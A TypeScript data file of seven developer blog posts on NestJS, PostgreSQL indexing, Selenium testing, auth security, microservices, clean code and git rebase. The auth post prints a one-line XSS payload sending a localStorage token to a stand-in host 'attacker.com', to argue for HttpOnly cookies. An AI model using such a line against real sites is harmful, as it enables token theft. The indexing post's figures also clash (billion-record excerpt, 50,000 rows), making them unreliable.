// Comprehensive local blog articles for static generation & API fallback
// These ensure every blog detail page loads instantly, even when the backend is cold-starting.

export interface BlogArticle {
  slug: string;
  title: string;
  excerpt: string;
  content: string;
  tags: string[];
  readTime: number;
  views: number;
  createdAt: string;
  coverImage?: string;
}

export const BLOG_DATA: Record<string, BlogArticle> = {
  'nestjs-architecture-journey': {
    slug: 'nestjs-architecture-journey',
    title: 'Beyond Code: My Journey with NestJS Architecture',
    excerpt: 'Moving from simple college scripts to enterprise-grade modular systems. Real-world insights into Dependency Injection and why code structure is everything.',
    tags: ['Backend', 'NestJS', 'Architecture'],
    readTime: 6,
    views: 342,
    createdAt: '2026-03-15T00:00:00.000Z',
    content: `
In college, I wrote code that worked. At CreateBytes, I learned to write code that *lasts*.

The shift from writing standalone scripts to building modular NestJS backends was the single most transformative leap in my engineering journey. This article captures what I learned — and what I wish someone had told me earlier.

## The College Mindset vs. Production Reality

In university, our projects had a predictable lifecycle: write code → demo → submit → forget. The codebase lived for a semester at most. Separation of concerns was a textbook concept, not a survival skill.

Then I joined CreateBytes and inherited a codebase that:
- Had been running in production for months
- Was being actively extended by multiple developers
- Served real paying customers who would notice if something broke

Suddenly, *how* I organized code mattered as much as *what* the code did.

## Why NestJS Changed My Thinking

NestJS doesn't just provide a framework — it enforces an **architectural opinion**. Coming from Express.js (where everything is a middleware and anything goes), NestJS felt restrictive at first. But that restriction turned out to be its superpower.

### Modules: The Unit of Organization

Every feature in NestJS lives inside a Module. When I built the RedPill Verify backend, the module structure looked like this:

\`\`\`
src/
├── auth/           # OTP, JWT, guards
├── deals/          # Deal lifecycle state machine
├── proposals/      # Negotiation flows
├── notifications/  # In-app + email notifications
├── users/          # Profile, RBAC
└── ml-verify/      # ML model integration
\`\`\`

Each module is self-contained: its own controller, service, DTOs, and entity. When I needed to add a new feature (say, dispute resolution), I created a new module — no need to touch existing code.

### Dependency Injection: Not Just a Buzzword

Before NestJS, I would import services directly:

\`\`\`typescript
// ❌ Tight coupling
import { UserService } from '../users/user.service';
const userService = new UserService();
\`\`\`

With NestJS DI:

\`\`\`typescript
// ✅ Loose coupling via DI
@Injectable()
export class DealService {
  constructor(
    private readonly userService: UserService,
    private readonly notificationService: NotificationService,
  ) {}
}
\`\`\`

The difference seems cosmetic until you need to:
- **Test**: Mock \`UserService\` without touching the filesystem or database
- **Swap**: Replace \`NotificationService\` with a different implementation
- **Debug**: Trace exactly which instance is being used and where it was configured

DI makes all of these trivial. Without it, they're painful.

## DTOs and Validation: The Gatekeepers

One of the earliest production bugs I encountered was accepting malformed data from the frontend. The API didn't crash — it silently saved garbage to the database.

NestJS + \`class-validator\` solved this permanently:

\`\`\`typescript
export class CreateDealDto {
  @IsString()
  @MinLength(3)
  title: string;

  @IsNumber()
  @Min(1)
  amount: number;

  @IsEmail()
  buyerEmail: string;

  @IsEnum(DealType)
  type: DealType;
}
\`\`\`

Every incoming request is validated *before* it reaches my service layer. Invalid data gets rejected with a clean 400 error. No more silent data corruption.

## Guards and Decorators: Declarative Security

Instead of scattering \`if (user.role !== 'admin')\` checks throughout my controllers, NestJS lets me declare permissions:

\`\`\`typescript
@UseGuards(AuthGuard('jwt'), RolesGuard)
@Roles('admin', 'arbitrator')
@Get('disputes')
findDisputes() {
  return this.dealService.findDisputes();
}
\`\`\`

Security becomes declarative, auditable, and impossible to accidentally skip.

## The Lesson That Stuck

Architecture is not about choosing the "best" framework. It's about choosing constraints that prevent your future self from making mistakes. NestJS doesn't let me write spaghetti code — and that's exactly why I trust it for production systems.

After 1+ year of building production backends with NestJS, I can confidently say: the framework you choose shapes the engineer you become.

---

*This article is based on my experience building three production NestJS backends at CreateBytes — Luxe Fitness, Krigat, and RedPill Verify.*
    `,
  },

  'production-database-indexing': {
    slug: 'production-database-indexing',
    title: 'The Day I Broke the Production Index',
    excerpt: 'A deep dive into Database performance. I learned why a missing index in a billion-record table is a silent killer, and how I fixed it during my internship.',
    tags: ['Databases', 'Performance', 'PostgreSQL'],
    readTime: 8,
    views: 518,
    createdAt: '2026-02-10T00:00:00.000Z',
    content: `
It was a Tuesday afternoon when the Slack alert fired: "API response time > 5 seconds on deal listing endpoint." What should have been a 50ms query was taking 8 seconds. The culprit? A missing index on a column I queried every single request.

This is the story of how a missing database index taught me more about production engineering than any textbook.

## The Setup

I was working on RedPill Verify — a fintech escrow platform built with NestJS and PostgreSQL. The \`deals\` table had grown organically:

\`\`\`sql
CREATE TABLE deals (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  title VARCHAR(255) NOT NULL,
  status VARCHAR(50) NOT NULL,
  buyer_id UUID NOT NULL,
  seller_id UUID NOT NULL,
  amount DECIMAL(12,2) NOT NULL,
  created_at TIMESTAMPTZ DEFAULT NOW(),
  updated_at TIMESTAMPTZ DEFAULT NOW()
);
\`\`\`

The table had around 50,000 records. Not massive, but enough to expose performance problems.

## The Bug

The deal listing endpoint filtered by \`status\` and sorted by \`created_at\`:

\`\`\`typescript
const deals = await this.dealRepo.find({
  where: { status: 'active', buyerId: userId },
  order: { createdAt: 'DESC' },
  take: 20,
});
\`\`\`

This translates to:

\`\`\`sql
SELECT * FROM deals 
WHERE status = 'active' AND buyer_id = $1 
ORDER BY created_at DESC 
LIMIT 20;
\`\`\`

Without an index, PostgreSQL performs a **sequential scan** — reading every single row in the table, checking each one against the WHERE clause, sorting the results, and then returning 20 rows. On 50K rows, this took ~8 seconds.

## The Fix

\`\`\`sql
CREATE INDEX idx_deals_status_buyer_created 
ON deals (status, buyer_id, created_at DESC);
\`\`\`

This composite index matches the exact query pattern: filter by status and buyer_id, then sort by created_at descending.

**Result**: Query time dropped from **8 seconds to 12 milliseconds**. A 667x improvement.

## What I Learned

### 1. EXPLAIN ANALYZE Is Your Best Friend

Before guessing, always run:

\`\`\`sql
EXPLAIN ANALYZE 
SELECT * FROM deals 
WHERE status = 'active' AND buyer_id = $1 
ORDER BY created_at DESC LIMIT 20;
\`\`\`

The output tells you exactly what PostgreSQL is doing — sequential scan vs. index scan, estimated vs. actual rows, sort operations, and total execution time.

### 2. Index Column Order Matters

A composite index on \`(status, buyer_id, created_at)\` is **not** the same as \`(created_at, status, buyer_id)\`. The leftmost columns are used for equality checks, and the rightmost column handles sorting.

### 3. Indexes Are Not Free

Every index:
- Consumes disk space
- Slows down INSERT/UPDATE/DELETE operations (the index must be updated)
- Must be maintained during VACUUM operations

Don't index everything. Index what you **query**.

### 4. The N+1 Query Problem Is Real

After fixing the index, I discovered the endpoint was also executing N+1 queries — loading each deal's buyer profile individually. Adding a \`JOIN\` (or TypeORM's \`relations\` option) eliminated 20 extra queries per request.

### 5. Monitor Before It Breaks

I set up query performance monitoring after this incident:

\`\`\`sql
-- Find slow queries
SELECT query, mean_time, calls 
FROM pg_stat_statements 
ORDER BY mean_time DESC 
LIMIT 10;
\`\`\`

Now I catch slow queries before users notice them.

## The Bigger Lesson

Database performance is not an optimization — it's a **requirement**. A 50ms query and an 8-second query return the same data, but one is a product and the other is a bug. The difference is often a single missing index.

---

*This experience at CreateBytes taught me that production engineering is about the details that textbooks skip — monitoring, indexing strategies, and the discipline to profile before you guess.*
    `,
  },

  'e2e-testing-reliability': {
    slug: 'e2e-testing-reliability',
    title: "E2E Testing: Moving from 'Should Work' to 'Does Work'",
    excerpt: 'How my perspective on Selenium shifted from a task to a strategic shield. Realizing the peace of mind that comes with automated verification.',
    tags: ['Testing', 'QA', 'Selenium'],
    readTime: 5,
    views: 289,
    createdAt: '2026-01-20T00:00:00.000Z',
    content: `
"It works on my machine." Every developer has said it. I've said it. And every time, I was wrong about something.

End-to-end testing with Selenium changed my relationship with deployment. Here's how.

## The Before: Deploying on Faith

Before writing E2E tests, my deployment workflow looked like this:

1. Write code
2. Manually click through the feature
3. Check a few edge cases
4. Push to production
5. Pray

This worked fine for simple features. It failed spectacularly for complex flows like Luxe Fitness's membership onboarding — a 7-step process involving form validation, payment processing, email delivery, and database writes.

Manual testing couldn't reliably catch:
- Race conditions between payment webhooks and database updates
- Edge cases in date calculations for subscription renewals
- CSS regressions that broke the flow on mobile devices
- Session expiry scenarios during multi-step forms

## The Aha Moment

It happened during a client demo. A membership form that I'd tested manually 30 minutes earlier failed because a CSS change in a completely unrelated component shifted a button below the fold on iPad. The client couldn't complete the signup.

That was the day I committed to automated E2E testing.

## Setting Up Selenium for Real-World Flows

Here's a simplified version of the membership onboarding test:

\`\`\`javascript
describe('Membership Onboarding Flow', () => {
  it('should complete full signup with payment', async () => {
    // Step 1: Navigate to signup
    await driver.get(BASE_URL + '/join');
    
    // Step 2: Fill personal details
    await driver.findElement(By.id('firstName')).sendKeys('Jane');
    await driver.findElement(By.id('lastName')).sendKeys('Smith');
    await driver.findElement(By.id('email')).sendKeys('jane@test.com');
    await driver.findElement(By.id('next-step')).click();
    
    // Step 3: Select membership tier
    await driver.wait(until.elementLocated(By.css('[data-tier="premium"]')));
    await driver.findElement(By.css('[data-tier="premium"]')).click();
    await driver.findElement(By.id('next-step')).click();
    
    // Step 4: Verify payment form appears
    await driver.wait(until.elementLocated(By.id('card-element')));
    
    // Step 5: Verify confirmation
    const confirmation = await driver.findElement(By.css('.confirmation-message'));
    expect(await confirmation.getText()).toContain('Welcome, Jane!');
  });
});
\`\`\`

## What Changed

### 1. Confidence in Deployment
With E2E tests covering critical flows, I deploy with data rather than faith. If the tests pass, the core user journeys work.

### 2. Regression Detection
When a CSS change breaks a form on mobile, the E2E test catches it before I push to production — not during a client demo.

### 3. Documentation Through Tests
E2E tests serve as living documentation of how the application is supposed to behave. New team members can read the tests to understand user flows.

### 4. The Peace of Mind Factor
There's a tangible mental shift when you know that automated tests are watching your back. You refactor more boldly, deploy more confidently, and sleep better.

## The Pragmatic Approach

I don't test everything with E2E. The testing pyramid still applies:
- **Unit tests** for business logic and utility functions
- **Integration tests** for API endpoints and database operations
- **E2E tests** for critical user journeys only — signup, payment, core workflows

E2E tests are slow and brittle by nature. Use them strategically for the flows that matter most.

## The Takeaway

Testing is not QA's job. Testing is an engineering discipline. Moving from "it should work" to "the tests prove it works" was one of the most important mindset shifts in my engineering growth.

---

*Written after 1+ year of implementing E2E test suites for production applications at CreateBytes.*
    `,
  },

  'modern-auth-security': {
    slug: 'modern-auth-security',
    title: 'JWT vs OAuth: Security Lessons from the Field',
    excerpt: 'Realizing why session management isn\'t just about "it works." A look at secure token storage and the common pitfalls in modern authentication flows.',
    tags: ['Security', 'Auth', 'Best Practices'],
    readTime: 7,
    views: 431,
    createdAt: '2025-12-15T00:00:00.000Z',
    content: `
Authentication is the first thing every app needs and the last thing most developers get right. After building three production auth systems at CreateBytes, here are the security lessons I learned the hard way.

## The Naive Approach (What I Did First)

My first production auth implementation stored JWTs in localStorage:

\`\`\`typescript
// ❌ Don't do this
localStorage.setItem('token', response.data.token);

// On every request
headers: { Authorization: \`Bearer \${localStorage.getItem('token')}\` }
\`\`\`

This "works" — until someone exploits an XSS vulnerability and steals every user's token with a single line of JavaScript:

\`\`\`javascript
// Any XSS payload can do this
fetch('https://attacker.com/steal?token=' + localStorage.getItem('token'));
\`\`\`

Game over.

## The Secure Approach

After researching OWASP guidelines and real-world security incidents, I implemented a proper token strategy for RedPill Verify:

### HttpOnly Cookies for Token Storage

\`\`\`typescript
// Server-side: Set token in HttpOnly cookie
res.cookie('access_token', token, {
  httpOnly: true,    // JavaScript cannot access this cookie
  secure: true,      // Only sent over HTTPS
  sameSite: 'strict', // No cross-site requests
  maxAge: 15 * 60 * 1000, // 15 minutes
});
\`\`\`

**Why HttpOnly?** JavaScript cannot read or modify HttpOnly cookies. Even if an XSS vulnerability exists, the attacker cannot steal the token.

### Short-Lived Access Tokens + Refresh Token Rotation

\`\`\`
Access Token:  15 minutes (short-lived, in HttpOnly cookie)
Refresh Token: 7 days (long-lived, in HttpOnly cookie, rotated on use)
\`\`\`

When the access token expires, the client silently calls \`/auth/refresh\`. The server:
1. Validates the refresh token
2. Issues a new access token
3. Issues a new refresh token (rotation)
4. Invalidates the old refresh token

This means even if a refresh token is somehow compromised, it can only be used once.

### OTP-Based Authentication (RedPill Verify)

For the fintech platform, passwords weren't secure enough. I implemented OTP verification:

\`\`\`
User enters email/phone
  → Server generates 6-digit OTP
  → OTP sent via email/SMS
  → User submits OTP
  → Server verifies OTP
  → JWT session created
\`\`\`

Additional security measures:
- **Rate limiting**: Max 5 OTP requests per hour per email
- **Expiry**: OTP expires after 5 minutes
- **Brute force protection**: Account locked after 5 failed attempts
- **One-time use**: OTP is invalidated immediately after successful verification

## JWT vs Session-Based Auth

| Factor | JWT | Sessions |
|--------|-----|----------|
| Storage | Client-side (cookie) | Server-side (Redis/DB) |
| Scalability | Stateless — scales horizontally | Requires shared session store |
| Revocation | Difficult (needs blocklist) | Easy (delete from store) |
| Size | Larger (contains claims) | Small (just session ID) |

For CreateBytes' projects, JWT was the right choice because:
- Microservice-friendly (no shared session store needed)
- Works cleanly with mobile apps (React Native)
- Stateless verification reduces database load

## RBAC: Beyond Basic Auth

Authentication tells you *who* the user is. Authorization tells you *what* they can do.

\`\`\`typescript
// NestJS custom decorator
@Roles('admin', 'arbitrator')
@UseGuards(AuthGuard('jwt'), RolesGuard)
@Get('admin/deals')
getAdminDeals() {
  return this.dealService.findAll();
}
\`\`\`

The RolesGuard checks:
1. Is the user authenticated? (valid JWT)
2. Does the user's role match the required roles? (RBAC check)
3. If not, return 403 Forbidden.

## The Security Checklist I Follow Now

- [ ] Tokens in HttpOnly, Secure, SameSite cookies — never localStorage
- [ ] Short access token lifetimes (15 min) with refresh token rotation
- [ ] Rate limiting on auth endpoints
- [ ] CORS configured to allow only known origins
- [ ] Helmet.js for HTTP security headers
- [ ] Input validation on every endpoint (class-validator)
- [ ] HTTPS everywhere — no exceptions

Security is not a feature. It's a discipline.

---

*Based on production auth implementations for Luxe Fitness, Krigat, and RedPill Verify at CreateBytes.*
    `,
  },

  'microservices-complexity-realities': {
    slug: 'microservices-complexity-realities',
    title: "Microservices: The Complexity Nobody Tells You About",
    excerpt: 'Understanding inter-service communication and the "Fallacies of Distributed Computing." Why microservices can be a hurdle before they are a help.',
    tags: ['Backend', 'Microservices', 'System Design'],
    readTime: 10,
    views: 387,
    createdAt: '2025-11-10T00:00:00.000Z',
    content: `
Everyone talks about microservices as the solution. Few talk about the problems they create. After studying distributed systems and observing production architectures at CreateBytes, here's what I've learned about when microservices help — and when they hurt.

## The Allure of Microservices

The pitch is compelling:
- **Independent deployment**: Ship features without coordinating with other teams
- **Technology diversity**: Use the best language/framework for each service
- **Scalability**: Scale bottleneck services independently
- **Team autonomy**: Small teams own small services

It sounds perfect. In practice, it trades one set of problems for another.

## The Fallacies of Distributed Computing

In 1994, Peter Deutsch (and later James Gosling) outlined the **8 Fallacies of Distributed Computing** — assumptions that developers make about networks that are always wrong:

1. **The network is reliable** — It's not. Packets get lost. Connections drop. DNS fails.
2. **Latency is zero** — Every network call adds milliseconds. Multiply by N services.
3. **Bandwidth is infinite** — Serialization overhead and payload sizes matter.
4. **The network is secure** — Every service-to-service call is an attack surface.
5. **Topology doesn't change** — Services move, IPs change, load balancers shift.
6. **There is one administrator** — Multiple teams, multiple configs, multiple failure modes.
7. **Transport cost is zero** — Network I/O is orders of magnitude slower than function calls.
8. **The network is homogeneous** — Different services, different protocols, different serialization.

These aren't theoretical concerns. They're bugs waiting to happen.

## The Monolith-First Approach

After studying successful architecture transitions (Shopify, Basecamp, Segment), I've adopted the **Monolith First** principle:

> Start with a well-structured monolith. Extract services only when you have a proven need.

At CreateBytes, our NestJS backends are **modular monoliths** — each feature is a separate module with clear boundaries, but they all run in a single process:

\`\`\`
src/
├── auth/           # Could become a service later
├── deals/          # Could become a service later  
├── notifications/  # Could become a service later
├── payments/       # Could become a service later
└── app.module.ts   # One deployment unit
\`\`\`

This gives us:
- **Module boundaries** (like microservices) without **network complexity**
- **Single deployment** — no inter-service communication failures
- **Shared database** — no distributed transactions needed
- **Simple debugging** — stack traces work, no distributed tracing needed

When (and if) a module needs to scale independently, we can extract it. But we don't pay the distributed systems tax upfront.

## When Microservices Actually Make Sense

Based on my study of production systems, microservices are justified when:

1. **Different scaling requirements**: Your video processing needs 100x the compute of your user API.
2. **Different team ownership**: Separate teams with separate release cycles and on-call rotations.
3. **Different technology requirements**: Your ML inference needs Python, but your API is in Node.js.
4. **Fault isolation**: A crash in one service should not bring down the entire system.

If none of these apply, you probably don't need microservices.

## The Complexity Cost

If you do go microservices, here's what you're signing up for:

### Inter-Service Communication
- REST vs. gRPC vs. message queues — each has trade-offs
- Circuit breakers for handling downstream failures
- Retry logic with exponential backoff
- Request tracing across service boundaries (OpenTelemetry)

### Data Consistency
- No more database transactions across services
- Eventual consistency patterns (Saga, Event Sourcing)
- Duplicate data across services for read performance
- Data synchronization bugs that are nearly impossible to reproduce

### Deployment & Operations
- Container orchestration (Kubernetes)
- Service discovery and load balancing
- Centralized logging and monitoring
- Health checks and readiness probes for every service

### Testing
- Integration tests between services
- Contract testing (Pact) to verify API compatibility
- Load testing for inter-service communication
- Chaos engineering to verify failure handling

## My Approach Going Forward

I build **modular monoliths** with **microservice-ready boundaries**. Each module has:
- Its own controller, service, repository, and DTOs
- Clear input/output interfaces
- No direct database access from other modules
- Dependency injection for loose coupling

This gives me the organizational benefits of microservices without the operational cost. If I ever need to extract a module into its own service, the boundaries are already clean.

## The Takeaway

Microservices are an organizational scaling strategy, not a technical one. Don't adopt them because they sound impressive. Adopt them because your team and product genuinely need independent deployment and scaling.

For most applications — especially early-stage products — a well-structured monolith is the right choice.

---

*Informed by production experience at CreateBytes and deep study of distributed systems literature (Designing Data-Intensive Applications by Martin Kleppmann is essential reading).*
    `,
  },

  'clean-code-maintainability': {
    slug: 'clean-code-maintainability',
    title: "Clean Code: The Cost of a 'Quick Fix'",
    excerpt: 'Realizing that technical debt is a real interest-bearing loan. How I improved my code review process to prioritize maintainability over speed.',
    tags: ['Software Engineering', 'Coding Patterns'],
    readTime: 4,
    views: 256,
    createdAt: '2025-10-05T00:00:00.000Z',
    content: `
"I'll clean it up later." I've said it. You've said it. We all know "later" never comes.

Technical debt is not a metaphor — it's a real, compounding cost. After 1+ year of production engineering, here's how I learned to avoid it.

## The Quick Fix That Wasn't Quick

Early in my internship, I needed to add a discount feature to Luxe Fitness's payment module. The "quick" approach:

\`\`\`typescript
// ❌ The quick fix
async processPayment(memberId: string, amount: number, planId: string) {
  let finalAmount = amount;
  
  // "Quick" discount logic
  if (planId === 'premium-annual') {
    finalAmount = amount * 0.85; // 15% off
  } else if (planId === 'premium-monthly' && isFirstMonth(memberId)) {
    finalAmount = amount * 0.90; // 10% off first month
  } else if (planId === 'student') {
    finalAmount = amount * 0.75; // 25% student discount
  }
  // ... 15 more conditions added over 3 months
  
  return this.chargeCard(memberId, finalAmount);
}
\`\`\`

Three months later, this function had 25 if-else branches for different discount rules. Every new promotion required modifying this critical payment function. Every change risked breaking existing discount logic.

## The Clean Refactor

\`\`\`typescript
// ✅ The maintainable approach
interface DiscountRule {
  name: string;
  applies: (context: PaymentContext) => boolean;
  calculate: (amount: number) => number;
}

const discountRules: DiscountRule[] = [
  {
    name: 'Annual Premium Discount',
    applies: (ctx) => ctx.planId === 'premium-annual',
    calculate: (amount) => amount * 0.85,
  },
  {
    name: 'First Month Promo',
    applies: (ctx) => ctx.planId === 'premium-monthly' && ctx.isFirstMonth,
    calculate: (amount) => amount * 0.90,
  },
  // Easy to add, remove, or modify rules
];

async processPayment(context: PaymentContext) {
  const applicableRule = discountRules.find(rule => rule.applies(context));
  const finalAmount = applicableRule 
    ? applicableRule.calculate(context.amount)
    : context.amount;
    
  return this.chargeCard(context.memberId, finalAmount);
}
\`\`\`

Adding a new discount? Add an object to the array. No risk to existing logic.

## TypeScript Strict Mode: The Guardrail

One of the best engineering decisions I made was enabling TypeScript strict mode:

\`\`\`json
{
  "compilerOptions": {
    "strict": true,
    "noImplicitAny": true,
    "strictNullChecks": true,
    "noUnusedLocals": true,
    "noUnusedParameters": true
  }
}
\`\`\`

Strict mode catches bugs at compile time that would otherwise surface in production:
- Accessing properties on potentially null/undefined values
- Implicit \`any\` types that bypass all type checking
- Unused variables that indicate dead or incomplete code

## The Code Review Mindset

After several months of production experience, my code review priorities shifted:

### What I Used to Look For:
1. Does it work?
2. Is the logic correct?
3. Are there obvious bugs?

### What I Look For Now:
1. **Is it readable?** Can someone understand this code in 6 months without the original author?
2. **Is it modular?** Can I change one thing without breaking another?
3. **Is it tested?** Does a test verify the behavior, not just the implementation?
4. **Is it named well?** Do function and variable names communicate intent?
5. Does it work? (Yes, this moved to last — because all of the above prevent bugs more effectively than spot-checking logic.)

## The Compound Interest of Clean Code

Technical debt compounds like financial debt:
- **Week 1**: Quick fix saves 30 minutes
- **Month 1**: 3 people have added to the quick fix; it's now 200 lines of spaghetti
- **Month 3**: Nobody wants to touch it; new features route around it with more hacks
- **Month 6**: A critical bug requires rewriting the entire function — costing 2 weeks

The 30-minute "savings" cost 2 weeks of engineering time.

## Rules I Follow Now

1. **No function over 30 lines** — if it's longer, it's doing too much
2. **No more than 3 parameters** — if it needs more, create a config object
3. **Name things for intent, not implementation** — \`calculateDiscountedPrice()\` not \`applyLogic()\`
4. **Every PR should leave the codebase cleaner than it found it**
5. **Write code for the reader, not the writer** — you write once, others read forever

---

*These patterns were refined during 1+ year of production engineering at CreateBytes, where code quality directly impacts client revenue.*
    `,
  },

  'git-rebase-guide': {
    slug: 'git-rebase-guide',
    title: "The Junior Engineer's Guide to Git Rebase",
    excerpt: 'Why history matters in collaborative environments. How to maintain a clean git log and why rebase is often a better tool than merge.',
    tags: ['Git', 'Workflow', 'Collaboration'],
    readTime: 5,
    views: 198,
    createdAt: '2025-09-15T00:00:00.000Z',
    content: `
Git merge works. Git rebase works *better* — when you know how to use it. Here's the guide I wish I had when I started my internship.

## Why Git History Matters

At CreateBytes, I work on codebases shared by multiple developers. When I need to understand *why* a particular piece of code exists, I run:

\`\`\`bash
git log --oneline --graph
\`\`\`

A clean history looks like this:

\`\`\`
* a1b2c3d feat: add OTP rate limiting
* d4e5f6g feat: implement refresh token rotation
* g7h8i9j fix: handle expired OTP gracefully
* j0k1l2m feat: add JWT authentication
\`\`\`

A messy history (from careless merging) looks like this:

\`\`\`
*   x9y8z7w Merge branch 'main' into feature/auth
|\\
| * a1b2c3d fix: typo
* | d4e5f6g Merge branch 'main' into feature/auth
|\\|
| * g7h8i9j update deps
* | j0k1l2m wip
* | m3n4o5p wip: still working on auth
\`\`\`

The first is debuggable. The second is chaos.

## Rebase vs. Merge: The Mental Model

**Merge** creates a new commit that combines two branches:
\`\`\`
      A---B---C  feature
     /         \\
D---E---F---G---H  main (merge commit H)
\`\`\`

**Rebase** replays your commits on top of the latest main:
\`\`\`
              A'--B'--C'  feature (rebased)
             /
D---E---F---G  main
\`\`\`

After rebase, your feature branch looks like it was developed from the latest main — no merge commits, clean linear history.

## My Daily Workflow

\`\`\`bash
# 1. Start feature work
git checkout -b feature/add-notifications

# 2. Make commits (small, focused)
git commit -m "feat: add notification schema"
git commit -m "feat: implement email notification service"
git commit -m "feat: add in-app notification controller"

# 3. Before opening PR, rebase onto latest main
git fetch origin
git rebase origin/main

# 4. If conflicts, resolve them one commit at a time
# Fix conflicts, then:
git add .
git rebase --continue

# 5. Clean up commits if needed (interactive rebase)
git rebase -i origin/main
# Squash WIP commits, reword messages

# 6. Force push (only on feature branches, NEVER on main)
git push --force-with-lease
\`\`\`

## The Golden Rules

1. **Never rebase shared branches** (main, develop) — only rebase YOUR feature branches
2. **Use \`--force-with-lease\`** instead of \`--force\` — it prevents overwriting others' work
3. **Rebase before opening a PR** — your PR should apply cleanly on top of the latest main
4. **Interactive rebase for clean history** — squash WIP commits, write clear commit messages

## Interactive Rebase: The Power Tool

\`\`\`bash
git rebase -i HEAD~3
\`\`\`

This opens your editor with:

\`\`\`
pick a1b2c3d feat: add notification schema
pick d4e5f6g wip: working on notifications
pick g7h8i9j feat: complete notification system
\`\`\`

Change it to:

\`\`\`
pick a1b2c3d feat: add notification schema
squash d4e5f6g wip: working on notifications
squash g7h8i9j feat: complete notification system
\`\`\`

Result: Three commits become one clean commit with a clear message.

## When to Use Merge Instead

Merge is the right choice when:
- You want to preserve the exact history of a long-running feature branch
- You're merging a PR (GitHub's "Merge pull request" button)
- You're combining release branches

For daily development work, rebase keeps history clean and reviewable.

---

*This workflow has been my daily practice throughout 1+ year at CreateBytes, keeping our shared codebase history clean and debuggable.*
    `,
  },
};

export function getBlogBySlug(slug: string): BlogArticle | undefined {
  return BLOG_DATA[slug];
}

export function getAllBlogSlugs(): string[] {
  return Object.keys(BLOG_DATA);
}
